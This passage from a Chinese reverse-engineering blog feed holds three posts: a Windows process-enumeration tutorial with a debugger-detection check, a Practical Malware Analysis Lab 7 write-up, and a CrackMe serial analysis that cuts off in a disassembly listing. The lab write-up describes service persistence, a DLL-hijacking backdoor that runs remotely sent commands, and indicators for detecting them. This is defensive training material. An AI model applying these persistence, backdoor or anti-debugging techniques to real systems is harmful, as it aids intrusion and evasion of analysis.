class="hljs-params"><span class="hljs-function">  HANDLE           hSnapshot,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPPROCESSENTRY32 lppe</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><p>hSnapshot：从上次调用CreateToolhelp32Snapshot函数返回的快照句柄。</p><p>lppe：指向PROCESSENTRY32结构的指针 。它包含进程信息，例如可执行文件的名称、进程标识符和父进程的进程标识符。</p><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>TRUE标识进程列表的第一个条目已经复制到缓冲区，FALSE表示失败。</p><h3 id="Process32Next"><a href="#Process32Next" class="headerlink" title="Process32Next"></a>Process32Next</h3><p>检索有关记录在系统快照中的下一个进程信息。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">Process32Next</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE           hSnapshot,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPPROCESSENTRY32 lppe</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h4><p>hSnapshot：处理从先前调用CreateToolhelp32Snapshot函数返回的快照句柄</p><p>lppe：指向PROCESSENTRY32结构的指针。</p><h4 id="返回值-2"><a href="#返回值-2" class="headerlink" title="返回值"></a>返回值</h4><p>如果进程列表的下一个条目已经复制到缓冲区，则返回TRUE；否则返回FALSE。如果不存在任何进程或者快照不包含进程信息，则GetLastError会显示ERROR_NO_MORE_FILES。</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>调用CreateToolhelp32Snapshot可以获取当前的进程快照，如果成功便会得到一个进程信息列表，并且返回这个列表的起始索引。然后调用Process32First获取第一个进程信息，进程的信息都保存在PROCESSENTRY32结构体的缓冲区中。若要获取下一个进程信息，就可以调用Process32Next，循环即可获取所有的进程信息。直到Process32Next函数返回值是FALSE，且GetLastError错误代码为ERROR_NO_MORE_FILES，这就表示遍历已经结束了。</p><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;tlhelp32.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>PROCESSENTRY32 pe = &#123; <span class="hljs-number">0</span> &#125;;<br>pe.dwSize = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(PROCESSENTRY32);<br><span class="hljs-comment">//进程快照</span><br>HANDLE hProcessSnap = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">//获取第一个进程信息</span><br>BOOL flag = <span class="hljs-built_in">Process32First</span>(hProcessSnap, &amp;pe);<br><span class="hljs-keyword">while</span> (flag)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[PID:%d]\t&quot;</span>, pe.th32ProcessID);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[%s]\n&quot;</span>, pe.szExeFile);<br><span class="hljs-comment">//获取下一个进程信息</span><br>flag = <span class="hljs-built_in">Process32Next</span>(hProcessSnap, &amp;pe);<br>&#125;<br><span class="hljs-built_in">CloseHandle</span>(hProcessSnap);<br><span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;pause&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>运行查看效果，可以看到可以打印出当前的所有进程信息</p><p><img src="/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/1.png"></p><h2 id="反调试功能测试"><a href="#反调试功能测试" class="headerlink" title="反调试功能测试"></a>反调试功能测试</h2><p>可以通过遍历所有进程来查找是否存在一个调试器，只需要比较一下进程名即可</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">lstrcmp</span>(pe.szExeFile, <span class="hljs-string">&quot;吾爱破解[LCG].exe&quot;</span>))<br>&#123;<br><span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;发现调试器&quot;</span>, <span class="hljs-string">&quot;！！！&quot;</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">break</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>打开OD，可以看到就会弹窗提示存在调试器。</p><p><img src="/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86/2.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>《Windows黑客编程技术详解》</p>]]></content>
    
    
    <categories>
      
      <category>黑客编程</category>
      
    </categories>
    
    
    <tags>
      
      <tag>恶意代码</tag>
      
      <tag>黑客编程</tag>
      
      <tag>功能技术</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>恶意代码分析实战-实验7</title>
    <link href="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/"/>
    <url>/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/</url>
    
    <content type="html"><![CDATA[<h2 id="Lab-7-1"><a href="#Lab-7-1" class="headerlink" title="Lab 7-1"></a>Lab 7-1</h2><h3 id="1-当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？"><a href="#1-当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？" class="headerlink" title="1.当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？"></a>1.当计算机重启，这个程序如何确保它继续运行（达到持久化驻留）？</h3><p>创建了一个系统服务来随系统启动，可以看到StartServiceCtrlDispatcherA函数。其中还有一个结构 ServiceStartTable。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-1.png"></p><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm">typedef struct _SERVICE_TABLE_ENTRYA &#123;<br>  <span class="hljs-type">LPSTR</span>                    lpServiceName;<br>  <span class="hljs-type">LPSERVICE_MAIN_FUNCTIONA</span> lpServiceProc;<br>&#125; <span class="hljs-type">SERVICE_TABLE_ENTRYA</span>, *<span class="hljs-type">LPSERVICE_TABLE_ENTRYA</span>;<br></code></pre></div></td></tr></table></figure><p>这个服务的名称是Malservice，servicemain函数是sub_401040。</p><h3 id="2-为什么这个程序会使用一个互斥量？"><a href="#2-为什么这个程序会使用一个互斥量？" class="headerlink" title="2.为什么这个程序会使用一个互斥量？"></a>2.为什么这个程序会使用一个互斥量？</h3><p>程序创建了一个名为“HGL345”的互斥量。</p><p>这是为了防止运行多个程序，首先调用OpenMutexA函数尝试打开名为“HGL345”互斥量句柄，如果已经存在就代表程序已经在运行了，就会退出，如果没有就调用 CreateMutexA创建互斥量。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-2.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-3.png"></p><h3 id="3-可以用来检测这个程序的基于主机特征是什么？"><a href="#3-可以用来检测这个程序的基于主机特征是什么？" class="headerlink" title="3.可以用来检测这个程序的基于主机特征是什么？"></a>3.可以用来检测这个程序的基于主机特征是什么？</h3><p>名为”Malservice“的服务或者是”HGL345“互斥量。</p><h3 id="4-检测这个恶意代码的基于网络特征是什么？"><a href="#4-检测这个恶意代码的基于网络特征是什么？" class="headerlink" title="4.检测这个恶意代码的基于网络特征是什么？"></a>4.检测这个恶意代码的基于网络特征是什么？</h3><p>在StartAddress函数中，会有联网的行为，可以看到其中的agent信息和URL。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-4.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-5.png"></p><h3 id="5-这个程序的目的是什么？"><a href="#5-这个程序的目的是什么？" class="headerlink" title="5.这个程序的目的是什么？"></a>5.这个程序的目的是什么？</h3><p>首先是创建互斥量防止启动多个。然后是创建一个名为Malservice的服务。然后开始设置时间，将时间设置为了2100年的1月1日0点。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-6.png"></p><p>然后调用WaitForSingleObject进入等待，等到前面设置的时间2100年1月1日0点。然后创建二十个同样的线程，来访问<a href="http://www.malwareanalysisbook.com/">http://www.malwareanalysisbook.com</a></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-1-7.png"></p><p>可以理解为一个DDOS的恶意程序。</p><h3 id="6-这个程序什么时候完成执行？"><a href="#6-这个程序什么时候完成执行？" class="headerlink" title="6.这个程序什么时候完成执行？"></a>6.这个程序什么时候完成执行？</h3><p>不会完成执行，到2100年会创建20个线程，但是每个线程都是一个无线循环。</p><h2 id="Lab-7-2"><a href="#Lab-7-2" class="headerlink" title="Lab 7-2"></a>Lab 7-2</h2><h3 id="1-这个程序如何完成持久化驻留？"><a href="#1-这个程序如何完成持久化驻留？" class="headerlink" title="1.这个程序如何完成持久化驻留？"></a>1.这个程序如何完成持久化驻留？</h3><p>这个程序没有持久化驻留，执行一次完成后就会退出。</p><h3 id="2-这个程序的目的是什么？"><a href="#2-这个程序的目的是什么？" class="headerlink" title="2.这个程序的目的是什么？"></a>2.这个程序的目的是什么？</h3><p>程序首先初始化了COM，然后创建了一个COM对象。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-2-1.png"></p><p>其中rclsid的值如下图所示，类标识符，对应的是Internet Explorer。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-2-2.png"></p><p>riid接口标识符对应的是IWebBrowser2。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-2-3.png"></p><p>返回的COM对象保存在ppv中，会调用偏移为0x2C处的函数，而这个函数是Navigate函数，函数调用后，就会打开浏览器浏览“<a href="http://www.malwareanalysisbook.com/ad.html%E2%80%9D%EF%BC%8C%E4%B9%8B%E5%90%8E%E5%B0%B1%E6%98%AF%E4%B8%80%E4%BA%9B%E6%B8%85%E7%90%86%E5%B7%A5%E4%BD%9C%E3%80%82">http://www.malwareanalysisbook.com/ad.html”，之后就是一些清理工作。</a></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-2-4.png"></p><h3 id="3-这个程序什么时候完成执行？"><a href="#3-这个程序什么时候完成执行？" class="headerlink" title="3.这个程序什么时候完成执行？"></a>3.这个程序什么时候完成执行？</h3><p>当执行完访问页面之后就会结束。</p><h2 id="Lab-7-3"><a href="#Lab-7-3" class="headerlink" title="Lab 7-3"></a>Lab 7-3</h2><h3 id="DLL"><a href="#DLL" class="headerlink" title="DLL"></a>DLL</h3><p>先来分析一下DLL文件</p><p>使用IDA打开DLL文件，首先可以看到，尝试打开一个互斥对象，如果不存在就创建一个互斥对象，互斥对象名为SADFHUHF</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-1.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-2.png"></p><p>然后就是SOCKET通信的流程，关于通信的流程可以参考<a href="https://b1ackie.cn/2021/08/06/%E4%BC%A0%E8%BE%93%E6%8A%80%E6%9C%AF-SOCKET%E9%80%9A%E4%BF%A1/">传输技术-SOCKET通信 </a>，这里地址是127.26.152.13：80，一个本地地址，真实情况肯定不会是一个本地的地址。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-3.png"></p><p>发送的信息是hello，然后会关闭这个send连接。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-4.png"></p><p>然后是recv函数接收信息，如果收到的信息是sleep就会调用sleep函数。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-5.png"></p><p>如果收到的信息是exec就会调用CreateProcessA来启动一个进程。进程是lpCommandLine这个参数。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-6.png"></p><p>看这个参数，看到是从第五个字节开始，而我们接收到的命令是exec XXXX，XXXX就是需要启动的进程。这是从远端发送过来的。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-7.png"></p><p>到这里基本上DLL就分析完毕了，再来分析一下EXE。</p><h3 id="EXE"><a href="#EXE" class="headerlink" title="EXE"></a>EXE</h3><p>分析一下EXE</p><p>要成功执行这个EXE还有一些限制，参数必须为WARNING_THIS_WILL_DESTROY_YOUR_MACHINE才可以执行这个程序。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-8.png"></p><p>像这样运行</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-9.png"></p><p>当满足条件后会开始运行程序，先创建了两个文件，C:\Windows\System32\kerne132.dll（注意这里不是“l”而是“1”）和Lab07-03.dll，还把它们映射到内存中。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-10.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-11.png"></p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-12.png"></p><p>再往下的代码比较多也比较复杂，我也没有过多分析，按照书上这部分是在比较内存、写入偏移或者写入内存。直接到后面来分析</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-13.png"></p><p>在进行完上述操作之后，先关闭句柄，然后复制文件，将Lab07-03.dll复制到C:</p><p>\Windows\System32\kerne132.dll，如果这个DLL已经存在的话，就不会调用4011E0这个函数，如果不存在复制过后就调用这个函数。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-14.png"></p><p>来查看这个函数，它的参数是C:\*，进来之后它会调用FindFirstFileA和FindNextFileA来遍历所有的文件，然后判断文件类型是否为EXE，</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-15.png"></p><p>如果是exe的话，就会调用4010A0函数它会将文件映射到内存中，然后调用IsBadReadPtr验证调用进程是否具有对指定内存范围的读取访问权限。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-16.png"></p><p>然后检查加载的DLL中是否存在kernel32.dll，如果存在的话就会让kerne132.dll替换它。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-17.png"></p><p>打开process monitor监控行为，可以看到大量的文件操作。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-18.png"></p><p>打开一个calc.exe查看其加载的DLL，可以看到加载了kerne132.dll。</p><p><img src="/2021/08/16/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98-%E5%AE%9E%E9%AA%8C7/7-3-19.png"></p><h3 id="1-这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？"><a href="#1-这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？" class="headerlink" title="1.这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？"></a>1.这个程序如何完成持久化驻留，来确保在计算机被重启后它能继续运行？</h3><p>在计算机中的每个EXE中都植入了一个DLL，相当于一个后门。</p><h3 id="2-这个恶意代码的两个明显的基于主机的特征是什么？"><a href="#2-这个恶意代码的两个明显的基于主机的特征是什么？" class="headerlink" title="2.这个恶意代码的两个明显的基于主机的特征是什么？"></a>2.这个恶意代码的两个明显的基于主机的特征是什么？</h3><p>一个是互斥量SADFHUHF，另一个是在C:\Windows\System32\文件夹下的kerne132.dll。</p><h3 id="3-这个程序的目的是什么？"><a href="#3-这个程序的目的是什么？" class="headerlink" title="3.这个程序的目的是什么？"></a>3.这个程序的目的是什么？</h3><p>搜索所有的EXE文件，并且让它们加载恶意的DLL文件kerne132.dll，这个DLL文件会进行一个SOCKET通信来执行操作，一个操作是sleep，另一个操作是会执行发送过来的进程，可能是恶意进程。</p><h3 id="4-一旦这个恶意代码被安装，你如何移除它？"><a href="#4-一旦这个恶意代码被安装，你如何移除它？" class="headerlink" title="4.一旦这个恶意代码被安装，你如何移除它？"></a>4.一旦这个恶意代码被安装，你如何移除它？</h3><p>如果安装，当前的exe文件都会加载这个恶意的DLL，可以写一个程序遍历所有的exe并且搜索其中的kerne132.dll，然后再用kernel.32替换它，或者复制kernel32.dll为kerne132.dll进行替换。</p>]]></content>
    
    
    <categories>
      
      <category>恶意代码分析实战</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>160CrackMe-011</title>
    <link href="/2021/08/16/160CrackMe-011/"/>
    <url>/2021/08/16/160CrackMe-011/</url>
    
    <content type="html"><![CDATA[<h2 id="初探"><a href="#初探" class="headerlink" title="初探"></a>初探</h2><p>打开程序看到主界面，不可以输入任何字符，只可以点击下面的这个小键盘来进行输入，右边提示一个状态上面写着未注册，猜测成功的话这里应该会发生变化，下面开始分析一下。</p><p><img src="/2021/08/16/160CrackMe-011/1.png"></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>无壳，使用VB语言编写</p><p><img src="/2021/08/16/160CrackMe-011/2.png"></p><p>使用OD，直接搜索字符串，就可以搜索到一大串类似注册码的字符串和REGISTRIERT。</p><p><img src="/2021/08/16/160CrackMe-011/3.png"></p><p>进入查看，可以看到在关键跳转前有一个比较，猜测应该是输入的内容经过一个计算之后与这个字符串进行比较。</p><p><img src="/2021/08/16/160CrackMe-011/4.png"></p><p>查看栈，可以看到当前输入123456计算出来的注册码</p><p><img src="/2021/08/16/160CrackMe-011/5.png"></p><p>开始寻找一下注册码的生成过程。</p><p>在跳转前面下断进行分析，可以看到流程是比较简单的，首先就是获取输入的第一位数字转为浮点数保存起来，然后每一位输入转为ascii码加上这个数字，第一位在前面加上一个0。也就是如果我们输入的是123456，那么我们输入的每一位字符都会加上数字1，也就是注册码第一位是0x31+1=0x32，然后是第一位所以要在前面加上一个0,就是032，第二位就是0x32+1=0x33,现在就是03233，以此类推就会生成前面图片中的字符串，0323334353637。</p><figure class="highlight x86asm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs x86asm">004048EB   .  <span class="hljs-number">52</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">edx</span>                                 <span class="hljs-comment">; /Step8 = NULL</span><br>004048EC   .  8D4D 9C       <span class="hljs-keyword">lea</span> <span class="hljs-built_in">ecx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x64</span>]          <span class="hljs-comment">; |</span><br>004048EF   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |/var18 = 005446A4</span><br>004048F0   .  <span class="hljs-number">51</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">ecx</span>                                 <span class="hljs-comment">; ||retBuffer8 = 00530000</span><br>004048F1   .  89B5 4CFFFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xB4</span>],<span class="hljs-built_in">esi</span>          <span class="hljs-comment">; ||msvbvm60.__vbaStrVarVal</span><br>004048F7   .  89B5 3CFFFFFF <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xC4</span>],<span class="hljs-built_in">esi</span>          <span class="hljs-comment">; ||msvbvm60.__vbaStrVarVal</span><br>004048FD   .  FF15 <span class="hljs-number">30104000</span> <span class="hljs-keyword">call</span> <span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ds</span>:[&lt;&amp;MSVBVM60<span class="hljs-number">.</span>__vbaLenVa&gt;<span class="hljs-comment">; |\__vbaLenVar</span><br><span class="hljs-number">00404903</span>   .  <span class="hljs-number">50</span>            <span class="hljs-keyword">push</span> <span class="hljs-built_in">eax</span>                                 <span class="hljs-comment">; |End8 = 005446A4</span><br><span class="hljs-number">00404904</span>   .  8D95 3CFFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">edx</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xC4</span>]          <span class="hljs-comment">; |</span><br>0040490A   .  8D85 08FFFFFF <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>,<span class="hljs-built_in">dword</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">ss</span>:[<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0xF8</span>]          <span class="hljs-comment">; |</span><br><span class="hljs-number">00404910</span>   .  